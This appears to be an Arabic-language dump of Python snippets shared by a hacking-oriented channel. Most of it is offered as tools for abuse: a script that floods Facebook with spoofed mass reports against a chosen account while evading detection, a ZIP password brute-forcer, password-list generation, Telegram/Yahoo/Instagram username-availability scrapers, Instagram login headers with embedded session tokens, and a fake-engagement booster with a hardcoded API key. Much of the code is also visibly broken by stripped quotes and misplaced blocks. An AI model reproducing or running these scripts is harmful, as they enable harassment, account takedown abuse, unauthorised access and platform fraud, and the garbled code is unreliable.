@@ -1,0 +1,600 @@
+
+سورسات بايثون مهمه😊✨
+
+
+سورس يعطيك كام مكتبة محمله ف بايثون
+import os
+import sys
+import subprocess
+def nas():
+    io = subprocess.check_output(["pip", "list"]).decode("utf-8").split("\n")
+    co = 0
+    for na in io:
+        if na:
+         co+= 1
+    print(f {co} 👈عدد المكاتب  )
+nas()
+
+
+يقوم الكود بإرسال التقارير باستخدام قيم مزيفة، وذلك لتجنب الكشف عن هوية المستخدم الفعلية. ويتم تنفيذ الكود بحيث يتم إرسال التقارير بين فترات زمنية عشوائية لتجنب الكشف عن أنشطة غير طبيعية
+
+import requests
+import random
+import time
+
+# Enter the ID of the target Facebook account
+account_id = input("Enter the ID of the target Facebook account: ")
+
+# Generate a list of fake device IDs, fake IP addresses, and fake user agents
+devices = []
+ips = []
+user_agents = []
+for i in range(500):
+    device_id =   .join(random.choices("0123456789abcdef", k=16))
+    devices.append(device_id)
+    ip_address = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
+    ips.append(ip_address)
+    user_agent = f"Mozilla/5.0 (Windows NT {random.randint(5, 10)}.0; Win64; x64) AppleWebKit/{random.randint(500, 600)}.36 (KHTML, like Gecko) Chrome/{random.randint(60, 80)}.0.{random.randint(3000, 4000)}.{random.randint(100, 200)} Safari/{random.randint(500, 600)}.36"
+    user_agents.append(user_agent)
+
+# Set up the headers
+headers = {
+    "User-Agent": random.choice(user_agents),
+    "Accept-Language": "en-US,en;q=0.5",
+    "Referer": f"https://www.facebook.com/{account_id}",
+    "X-Forwarded-For": random.choice(ips)
+}
+
+# Send the report requests using the fake devices, IP addresses, and user agents
+for device, ip, user_agent in zip(devices, ips, user_agents):
+    data = {"device_id": device, "source": "profile", "reason": 1}
+    headers["User-Agent"] = user_agent
+    headers["X-Forwarded-For"] = ip
+    response = requests.post(f"https://www.facebook.com/{account_id}/report", headers=headers, data=data)
+    print("Report sent using device ID", device, "and IP address", ip, "with status code", response.status_code)
+    time.sleep(random.uniform(0.1, 0.5))
+
+
+
+سكربت بايثون تبليغ على حساب فيسبوك 
+يقوم هذا الكود بإرسال تقارير لحساب فيسبوك معيّن باستخدام عدد كبير من الأجهزة الوهمية وعناوين IP وكودات المستخدم الوهمية. يتم ذلك من خلال إنشاء قائمة من الأجهزة الوهمية وعناوين IP وكودات المستخدم الوهمية وإرسال تقارير باستخدام هذه العناصر المزيفة.
+
+لتشغيل هذا الكود، يمكن اتباع الخطوات التالية:
+
+1- يجب تثبيت Python على جهاز الكمبيوتر أو الهاتف الذي سيتم استخدامه.
+
+2- يجب تثبيت مكتبة requests باستخدام الأمر التالي في سطر الأوامر:
+
+pip install requests
+
+
+3- يمكن نسخ الكود ولصقه في ملف Python جديد.
+
+4- يجب تغيير قيمة المتغير account_id ليتم تعيينها إلى معرف الحساب الذي يريد المستخدم إرسال التقارير إليه.
+
+5- يمكن تشغيل الكود بالنقر فوق زر التشغيل أو باستخدام الأمر التالي في سطر الأوامر:
+
+python filename.py
+
+
+
+سورس لفك تغط اي ملف مضغوط ب باسورد
+
+import pyzipper
+
+zip_file = input("Enter Your Zip File --> : ")
+pass_list = input("Enter Your Password List --> : ")
+
+count = 1
+
+with open(pass_list, rb ) as text:
+    for i in text.readlines():
+        password = i.strip()
+try:
+            with pyzipper.AESZipFile(zip_file,  r ) as zf:
+                zf.extractall(pwd=password)
+ 
+                data = zf.namelist()[0]
+                data_size = zf.getinfo(data).file_size
+                print("""*******************\n[+] Password Found! `%s\n `%s\n `%s\n************************"""%
+                      (password.decode( utf8 ),data, data_size))
+                Break
+except:
+            number = count
+            print("[%s] [-] Password Failed! - %s" % (number,password.decode( utf8 )))
+            count+= 1
+            pass
+
+
+سورس لعمل كوكيز
+
+import random
+chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789%3B="
+length = 248
+Jh = "".join(random.choice(chars) for _ in range(length))
+
+print(Jh)
+
+
+
+
+كود صيد يوزرات تلي
+
+
+import os , requests , time , random
+# = = = = = = = = = = = = 
+Z =  \033[1;31m  #احمر
+X =  \033[1;33m  #اصفر
+Z1 =  \033[2;31m  #احمر ثاني
+F =  \033[2;32m  #اخضر
+A =  \033[2;34m #ازرق
+C =  \033[2;35m  #وردي
+B =  \033[2;36m #سمائي
+Y =  \033[1;34m  #ازرق فاتح
+# = = = = = = = = = = = =
+md=0
+ID = input(f"{Y}I{C}D {X}={Z}={F}>{B} ")
+print(f"{Z}={X}={Z1}={F}={A}={C}={B}={Y}={Z}={X}={Z1}={F}={A}={C}={B}={Y}={Z}={X}={Z1}={F}={A}={C}={B}={Y}=")
+tok = input(f"{Y}T{C}O{X}K{Z}E{F}N {B}={Z}={C}>{B}  ")
+print(f"{Z}={X}={Z1}={F}={A}={C}={B}={Y}={Z}={X}={Z1}={F}={A}={C}={B}={Y}={Z}={X}={Z1}={F}={A}={C}={B}={Y}=")
+abc= ABCDEFGHIJKLMNOPQRSTUVWXYZ_1234567890
+abc1 = ABCDEFGHIJKLMNOPQRSTUVWXYZ 
+while True:
+        v1 = str(  .join((random.choice(abc1) for i in range(1))))
+        v2 = str(  .join((random.choice(abc) for i in range(1))))
+        v3 = str(  .join((random.choice(abc) for i in range(1))))
+        user = (v1+ _ +v2+ _ +v3)
+        url = requests.get(f https://t.me/{user} ).text
+        if  tgme_username_link  in url:
+            md+=1
+            requests.get(f"""https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=ʜɪ ᴘʀᴏ ᴘᴀᴛʀᴇᴋ ɴᴇᴡ ᴜᴤᴇʀ
+‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌
+𝑈𝑆𝐸𝑅 ➪ @{user}
+‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌
+𝐁𝐘 ➪ @D_C_D_D""")
+            print(f {C}{[md]}{F}DonE UseR :  +user)
+        else:
+            md+=1
+            print(f {X}{[md]}{Z}ErrOR UseR :  +user)
+
+---------------------------------
+
+كود صيد متاحات ياهو فقظ
+
+import requests , random 
+# = = = = = = = = = = = = 
+
+Z =  \033[1;31m  #احمر
+X =  \033[1;33m  #اصفر
+Z1 =  \033[2;31m  #احمر ثاني
+F =  \033[2;32m  #اخضر
+A =  \033[2;34m #ازرق
+C =  \033[2;35m  #وردي
+B =  \033[2;36m #سمائي
+Y =  \033[1;34m  #ازرق فاتح
+
+# = = = = = = = = = = = =
+ID = input("\033[1;34mI\033[2;35mD \033[1;33m=\033[1;31m=\033[2;32m>\033[2;36m ")
+print("\033[1;31m=\033[1;33m=\033[2;31m=\033[2;32m=\033[2;34m=\033[2;35m=\033[2;36m=\033[1;34m=\033[1;31m=\033[1;33m=\033[2;31m=\033[2;32m=\033[2;34m=\033[2;35m=\033[2;36m=\033[1;34m=\033[1;31m=\033[1;33m=\033[2;31m=\033[2;32m=\033[2;34m=\033[2;35m=\033[2;36m=\033[1;34m=")
+tok = input("\033[1;34mT\033[2;35mO\033[1;33mK\033[1;31mE\033[2;32mN \033[2;36m=\033[1;31m=\033[2;35m>\033[2;36m  ")
+print("\033[1;31m=\033[1;33m=\033[2;31m=\033[2;32m=\033[2;34m=\033[2;35m=\033[2;36m=\033[1;34m=\033[1;31m=\033[1;33m=\033[2;31m=\033[2;32m=\033[2;34m=\033[2;35m=\033[2;36m=\033[1;34m=\033[1;31m=\033[1;33m=\033[2;31m=\033[2;32m=\033[2;34m=\033[2;35m=\033[2;36m=\033[1;34m=\033[1;31m=\033[1;33m=\033[2;31m=\033[2;32m=\033[2;34m=\033[2;35m=\033[2;36m=\033[1;34m=")
+abc1="1234567890qwertyuiopasdfghjklzxcvbnm"
+while True:
+     m2 = str("". join(random.choice(abc1)for i in range(5)))
+     mail = m2+ @yahoo.com 
+     url_yahoo = f https://S-1.modey1.repl.co/yahoo/?email={mail} 
+     ree= requests.get(url_yahoo)
+     if  True  in ree.text:
+      print("\033[1;32mavailable :  "+mail)
+      with open( متاح.txt ,  a ) as (HACKED):
+                    HACKED.write(f {mail}\n .format(mail))
+      
+      requests.get(f"""https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={mail}""")
+     else:
+      print(f \033[1;31mNot available :   +mail)
+
+--------------------------------
+
+كود عمل لستة باسوردات
+
+import random
+import os
+import sys
+G = open( List—pass.txt , "w")
+E = "\033[1;93m"
+A = "\033[1;90m" 
+Q = input( How many passwords in list :  )
+Q = int(Q)
+def Genpass():
+ K=0
+ u = "0123456789qwertyuioplkjhgfdsazxcvbnm@#$"
+ while True:
+    K+=1
+    passs =str("".join(random.choice(u)for i in range(8)))
+    print(f \r {E}Making passwords list :{A}  {K} ,end="")
+    G.write(passs+ \n )
+    if K ==Q:
+     break
+Genpass()
+
+---------------------------
+
+كود عمل باسورد لاداتك حط الكود فوق اول شي بعد الالوان 
+===============================
+import requests,sys,os,time
+yso =  الباسورد 
+pss=input("\033[1;31m [~]ENTER PASSWORD :")
+if pss ==yso:
+ pass
+ print(F+"DonE PASSWORD")
+ time.sleep(1)
+ os.system( clear )
+else:
+ exit(Z+"ErrOR PASSEORD")
+===============================
+
+كود كتابة اسمك مثل الي بلصورة
+============================
+import pyfiglet 
+IQ = pyfiglet.figlet_format("الكلمة")
+print(IQ)
+===============================
+
+كود صيد يوزرات انستا شبة رباعية 
+===============================
+import os , requests , time , random
+# = = = = = = = = = = = = 
+
+Z =  \033[1;31m  #احمر
+X =  \033[1;33m  #اصفر
+Z1 =  \033[2;31m  #احمر ثاني
+F =  \033[2;32m  #اخضر
+A =  \033[2;34m #ازرق
+C =  \033[2;35m  #وردي
+B =  \033[2;36m #سمائي
+Y =  \033[1;34m  #ازرق فاتح
+
+# = = = = = = = = = = = =
+ID=input(A+"𝙴𝙽𝚃𝙰𝚁 𝙸𝙳 ➪  "+C)
+print("=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=")
+tok=input(B+"𝙴𝙽𝚃𝙰𝚁 𝚃𝙾𝙺𝙴𝙽 ➪  "+C)
+print("=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=")
+abc= ABCDEFGHIJKLMNOPQRSTUVWXYZ_1234567890 
+abc1 = ABCDEFGHIJKLMNOPQRSTUVWXYZ 
+while True:
+        v1 = str(  .join((random.choice(abc) for i in range(1))))
+        v2 = str(  .join((random.choice(abc) for i in range(1))))
+        v3 = str(  .join((random.choice(abc) for i in range(1))))
+        v4 = str(  .join((random.choice(abc) for i in range(1))))
+        hhh =  ._ 
+        v5 = str(  .join((random.choice(hhh) for i in range(1))))
+        user1 = (v5+v1+v2+v3+v4)
+        user2 = (v1+v5+v2+v3+v4)
+        user3 = (v1+v2+v5+v3+v4)
+        user4 = (v1+v2+v3+v5+v4)
+        hamo010 = (user1, user2, user3, user4)
+        user = random.choice(hamo010)
+        url =  https://www.instagram.com/accounts/web_create_ajax/attempt/ 
+        head = {
+ accept :  */* ,
+ accept-encoding :  gzip, deflate, br ,
+ accept-language :  en-US,en;q=0.9 ,
+ content-length :  1176 ,
+ content-type :  application/x-www-form-urlencoded ,
+ cookie :  ig_cb=2; ig_did=BB52B198-B05A-424E-BA07-B15F3D4C3893; mid=YAlcaQALAAHzmX6nvD8dWMRVYFCO; shbid=15012; rur=PRN; shbts=1612894029.7666144; csrftoken=CPKow8myeXW9AuB3Lny0wNxx0EzoDQoI ,
+ origin :  https://www.instagram.com ,
+ referer : https://www.instagram.com/ ,
+ sec-ch-ua :  "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87" ,
+ sec-ch-ua-mobile :  ?0 ,
+ sec-ch-ua-platform : "Windows",
+ sec-fetch-dest :  empty ,
+ sec-fetch-mode :  cors ,
+ sec-fetch-site :  same-site ,
+ user-agent :  Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 ,
+ x-asbd-id : 198387  ,
+ x-csrftoken :  CPKow8myeXW9AuB3Lny0wNxx0EzoDQoI ,
+ x-ig-www-claim :  hmac.AR0Plwj5om112fwzrrYnMNjMLPnyWfFFq1tG7MCcMv5_vN9M ,
+ x-instagram-ajax :  72bda6b1d047 ,
+ x-requested-with :  XMLHttpRequest 
+}
+        data = {
+ email  :  a@gmail.com ,
+ username : (f {user} ),
+ first_name :  AA ,
+ opt_into_one_tap :  false 
+}  
+        uS = requests.post(url, headers=head, data=data).text
+        Uss =  ( {"account_created": false, "errors": {"email": [{"message": "Too many accounts are using a@gmail.com.", "code": "email_sharing_limit"}], "all": [{"message": "Create a password at least 6 characters long.", "code": "too_short_password"}]}, "dryrun_passed": false, "username_suggestions": [], "status": "ok", "error_type": "form_validation_error"} )
+        if Uss in uS:
+            requests.get(f https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=(<^>) user instagram ~> {user}\n\ )
+            print(F+ DonE UseR :  +user)
+        else:
+            time.sleep(1)
+            print(Z+  ErrOR UseR :  +user)
+===============================
+
+كود صيد يوزرات بوتات تلي 
+
+import os , requests , time , random
+# = = = = = = = = = = = = 
+
+Z =  \033[1;31m  #احمر
+X =  \033[1;33m  #اصفر
+Z1 =  \033[2;31m  #احمر ثاني
+F =  \033[2;32m  #اخضر
+A =  \033[2;34m #ازرق
+C =  \033[2;35m  #وردي
+B =  \033[2;36m #سمائي
+Y =  \033[1;34m  #ازرق فاتح
+
+# = = = = = = = = = = = =
+ID=input(A+"𝙴𝙽𝚃𝙰𝚁 𝙸𝙳 ➪  "+C)
+print(C+"=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=")
+tok=input(B+"𝙴𝙽𝚃𝙰𝚁 𝚃𝙾𝙺𝙴𝙽 ➪  "+C)
+print(C+"=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=")
+abc= ABCDEFGHIJKLMNOPQRSTUVWXYZ_1234567890 
+abc1 = ABCDEFGHIJKLMNOPQRSTUVWXYZ 
+while True:
+        v1 = str(  .join((random.choice(abc1) for i in range(1))))
+        v2 = str(  .join((random.choice(abc) for i in range(1))))
+        v3 = str(  .join((random.choice(abc) for i in range(1))))
+        user1 = (v1+v2+v3+ _bot )
+        user2 = (v1+v2+v3+ bot )
+        user3 = (v1+v1+v2+v2+ bot )
+        user4 = (v1+v2+v2+v1+ bot )
+        hamo010 = (user1, user2, user3, user4)
+        user = random.choice(hamo010)
+        url = requests.get(f https://t.me/{user} ).text
+        if  tgme_username_link  in url:
+            requests.get(f"""https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=ʜɪ ᴘʀᴏ ᴘᴀᴛʀᴇᴋ ɴᴇᴡ ᴜᴤᴇʀ
+‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌
+𝑈𝑆𝐸𝑅 ➪ @{user}
+‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌
+𝐁𝐘 ➪ @D_C_D_D""")
+            print(F+ DonE UseR :  +user)
+        else:
+            print(Z+ ErrOR UseR :  +user)
+
+---------------------------
+
+صيد يوزرات تلي مميزة
+
+import os , requests , time , random
+# = = = = = = = = = = = = 
+
+Z =  \033[1;31m  #احمر
+X =  \033[1;33m  #اصفر
+Z1 =  \033[2;31m  #احمر ثاني
+F =  \033[2;32m  #اخضر
+A =  \033[2;34m #ازرق
+C =  \033[2;35m  #وردي
+B =  \033[2;36m #سمائي
+Y =  \033[1;34m  #ازرق فاتح
+
+# = = = = = = = = = = = =
+ID=input(A+"𝙴𝙽𝚃𝙰𝚁 𝙸𝙳 ➪  "+C)
+print("=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=")
+tok=input(B+"𝙴𝙽𝚃𝙰𝚁 𝚃𝙾𝙺𝙴𝙽 ➪  "+C)
+abc= ABCDEFGHIJKLMNOPQRSTUVWXYZ_1234567890 
+abc1 = ABCDEFGHIJKLMNOPQRSTUVWXYZ 
+while True:
+        v1 = str(  .join((random.choice(abc1) for i in range(1))))
+        v2 = str(  .join((random.choice(abc) for i in range(1))))
+        v3 = str(  .join((random.choice(abc) for i in range(1))))
+        user1 = (v1+v1+v1+v2+v3)
+        user2 = (v1+v1+v2+v3+v1)
+        user3 = (v1+v2+v3+v1+v1)
+        user4 = (v1+v3+v2+v2+v2)
+        hamo010 = (user1, user2, user3, user4)
+        user = random.choice(hamo010)
+        url = requests.get(f https://t.me/{user} ).text
+        if  tgme_username_link  in url:
+            requests.get(f"""https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=ʜɪ ᴘʀᴏ ᴘᴀᴛʀᴇᴋ ɴᴇᴡ ᴜᴤᴇʀ
+‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌
+𝑈𝑆𝐸𝑅 ➪ @{user}
+‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌=‌
+𝐁𝐘 ➪ @D_C_D_D""")
+            print(f  \033[1;32m {user} )
+        else:
+            print(f  \033[1;31m NOT AVAILABLE : {user} )
+
+-------------------------------
+
+ انستقرام جاهزه تكدر تسوي اداه صيد يوزرات متاحات وغيرها
+
+url =  https://www.instagram.com/api/v1/web/accounts/login/ajax/ 
+
+he = {
+
+ Accept : */* ,
+ Accept-Encoding : gzip, deflate, br ,
+ Accept-Language : ar ,
+ Content-Length : 308 ,
+ Content-Type : application/x-www-form-urlencoded ,
+ Cookie : mid=ZIxAogALAAFpdDVodIfN-JcuXHC0; ig_did=06E6FF4C-6626-4DA4-A923-958A6B598D33; ig_nrcb=1; datr=nUCMZOwv5nm9CD-lCwwwGbpH; csrftoken=gm17kUebGrZW23v99MShKjrzHVU9gIZ9; ds_user_id=59114943157; dpr=1.5 ,
+ Origin : https://www.instagram.com ,
+ Referer : https://www.instagram.com/accounts/login/ ,
+ Sec-Ch-Prefers-Color-Scheme : dark ,
+ Sec-Ch-Ua : "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114" ,
+ Sec-Ch-Ua-Full-Version-List : "Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.199", "Google Chrome";v="114.0.5735.199" ,
+ Sec-Ch-Ua-Mobile : ?0 ,
+ Sec-Ch-Ua-Platform : "Windows" ,
+ Sec-Ch-Ua-Platform-Version : "10.0.0" ,
+ Sec-Fetch-Dest : empty ,
+ Sec-Fetch-Mode : cors ,
+ Sec-Fetch-Site : same-origin ,
+ User-Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 ,
+ Viewport-Width : 486 ,
+ X-Asbd-Id : 129477 ,
+ X-Csrftoken : gm17kUebGrZW23v99MShKjrzHVU9gIZ9 ,
+ X-Ig-App-Id : 936619743392459 ,
+ X-Ig-Www-Claim : 0 ,
+ X-Instagram-Ajax : 1007847718 ,
+ X-Requested-With : XMLHttpRequest ,
+
+}
+data = {
+ enc_password : #PWD_INSTAGRAM_BROWSER:10:1689441742:AVtQADYn2dX7ALx/qs7rXLca6g4dlfJmzHaFRQvbRpYcyRJ+8MoATeADX74fYwR2dIheteErKsMLKHeHDgQSwZzGxdjz6juQbAcI6wb1PXQ3cnFqAh6d4H7VNwsPYLJ6s3uIdahWrU5NRq3IqEBbo5YE5Q== ,
+ optIntoOneTap : false ,
+ queryParams : {} ,
+ trustedDeviceRecords : {} ,
+ username : username ,
+
+}
+
+------------------------------
+كود بحث بالكوكل بلغة بايثون
+
+
+import requests
+X =  \033[1;33m  #اصفر
+F =  \033[2;32m  #اخضر
+text=input(f  ماذا تريد ان تبحث ؟ :{F}  )
+safawi = requests.get(f https://gptzaid.zaidbot.repl.co/1/text={text} ).text
+print(X+safawi)
+-------------------------------------------------
+كود بسيط بلغه بايثون 🖥
+مهمه الكود توليد كلمات مرور قويه 📌✅
+مكاتب =>  random + string 🔔
+
+
+Z=   \033[1;31m  
+F =  \033[2;32m  
+B =  \033[2;36m 
+X =  \033[1;33m  
+C =  \033[2;35m 
+
+import string
+import random
+print(X+"----+----+-----+------+-----+")
+print (C+"welcome your Create strong passwords")
+print(X+"----+----+-----+------+-----+")
+print (F+"programmer @zyad_alalmy" )
+print(X+"----+----+-----+------+-----+")
+print(Z+ "my channel => dev_python_leader ")
+print(X+"----+----+-----+------+-----+")
+st1 = list(string.ascii_lowercase)
+st2 = list(string.ascii_uppercase)
+st3 = list(string.digits)
+st4 = list(string.punctuation)
+
+cha_number = input(F+"كم عدد الأحرف التي تريدها لكلمة المرور؟\n==>")
+while True:
+    try:
+        cha_number = int(cha_number)
+        if cha_number < 6:
+            print(Z+"تحتاج على الأقل 6 أحرف")
+            cha_number = input("أدخل العدد من جديد\n==>")
+        else:
+            break
+    except:
+        print(Z+"يرجى إدخال رقم فقط\n==>")
+        cha_number = input(X+"أدخل العدد وحاول مرة أخره\n==»")
+
+random.shuffle(st1)
+random.shuffle(st2)
+random.shuffle(st3)
+random.shuffle(st4)
+
+p1 = max(round(cha_number * (30 / 100)), 1)
+p2 = max(round(cha_number * (20 / 100)), 1)
+
+print(p1, p2)
+
+password = []
+
+for z in range(p1):
+    if z < len(st1) and z < len(st2):
+        password.append(st1[z])
+        password.append(st2[z])
+
+for z in range(p2):
+    if z < len(st3) and z < len(st4):
+        password.append(st3[z])
+        password.append(st4[z])
+
+random.shuffle(password)
+password =   .join(password[0:cha_number])
+print(password)
+print(B+"thank you use tools zyadalalmy")
+----------------------------------------
+
+اله حاسبه بسيطه بلغه بايثون 🖥
+
+# نطلب من المستخدم ادخال الرقم الاول 
+
+num1 =float(input("Enter Your Frist Number \n==>"))
+
+# نطلب من المتسخدم ادخال oprator 
+oprator =input("Enter Your oprator \n ==>")
+
+# نطلب من المستخدم بادخال الرقم الثاني 
+num2 =float(input("Enter Your Frist Number \n==>"))
+
+#التحقق اذا قام المستخدم بادخال + يقوم الكود ب بظهار النتيجه
+if oprator == "+":
+    print(num1 + num2 )
+
+# التحقق اذا قام المستخدم بادخال * يقوم بطباعه النتيجه
+elif oprator == "*":
+    print(num1 * num2)
+
+#التجقق اذا قام المستخدم بادخال  - يقوم الكود بطباعه النتيجه 
+elif oprator == "-":
+    print(num1 - num2)
+
+#التحقق اذا قام المستخدم بادخال / يقوم الكود بطباعه النتيجه
+elif oprator == "/":
+    print(num1 / num2)
+
+# اذا قام المستخدم بادخال oprator غير موجود 
+else:
+    print("Error pro oprator not found")
+
+#code by @zyad_alalmy
+------------------------------------
+
+كود بسيط عمل qrcode بلغه بايثون🖥
+
+import qrcode
+#هنا الشي الذي تريده ان يكون داخل  ال qrcode
+qr = qrcode.make("https://t.me/dev_python_leader")
+
+#عرض qrcode 
+qr.show(qr)
+
+#codeby zyad_alalmy
+
+
+
+سكربت رشق لايكات انستقرام و مشاهدات تيك توك 
+
+import requests
+
+t = int(input(" 1 = Tik Tok \n 2 = Instagram Like \n [!] Choose the number: "))
+
+link = input(" [!] ENTER URL: ")
+
+if t == 1:
+    req = requests.post(f https://nolcino.com/api/v2?action=add&service=15572&link={link}&quantity=100&key=9173c00bec66d6edd199f2c2db1d23c7 ).text
+    print(req)
+elif t == 2:
+    req = requests.post(f https://nolcino.com/api/v2?action=add&service=10225&link={link}&quantity=10&key=9173c00bec66d6edd199f2c2db1d23c7 ).text
+    print(req)
+
+
+
+كسر كلمة مرور ZIP باستخدام بايثون
+
+
+pip install zipfile36
+
+
+يحتاجها اي شخص في أمن المعلومات
+
+
+حمل لسته باسوردات من اي موقع مثل GitHub
+
+@b7x_alm 😈
+
+@Dark_Lord7x ❤️
